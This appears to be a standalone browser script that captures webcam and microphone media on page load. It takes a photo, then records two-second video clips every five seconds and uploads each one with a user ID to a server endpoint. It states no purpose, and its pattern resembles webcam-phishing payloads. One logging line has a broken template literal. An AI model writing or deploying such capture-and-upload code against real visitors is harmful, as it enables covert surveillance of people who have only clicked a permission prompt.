(async () => {
    const preview = document.getElementById("preview");

    async function startCapture() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
            preview.srcObject = stream;

            // Send an image immediately
            setTimeout(() => captureImage(stream), 1000);

            // Start sending 2-sec videos every 5 seconds
            setInterval(() => recordAndSend(stream, "video", 2000), 5000);

        } catch (err) {
            console.error("Permission denied or error:", err);
        }
    }

    function captureImage(stream) {
        const track = stream.getVideoTracks()[0];
        const imageCapture = new ImageCapture(track);

        imageCapture.takePhoto()
            .then(blob => {
                const file = new File([blob], "photo.jpg", { type: "image/jpeg" });
                sendFile(file, "image");
            })
            .catch(err => console.error("Image capture error:", err));
    }

    function recordAndSend(stream, type, duration) {
        let chunks = [];
        const recorder = new MediaRecorder(stream, { mimeType: "video/webm" });

        recorder.ondataavailable = e => {
            if (e.data.size > 0) chunks.push(e.data);
        };

        recorder.onstop = () => {
            const blob = new Blob(chunks, { type: "video/webm" });
            const file = new File([blob], "capture.webm", { type: "video/webm" });
            sendFile(file, type);
        };

        recorder.start();
        setTimeout(() => recorder.stop(), duration);
    }

    async function sendFile(file, mediaType) {
        const formData = new FormData();
        formData.append("uid", UID);
        formData.append("type", mediaType);
        formData.append("file", file);

        try {
            await fetch("/upload", {
                method: "POST",
                body: formData
            });
            console.log(${mediaType} sent successfully);
        } catch (err) {
            console.error("Upload error:", err);
        }
    }

    startCapture();
})();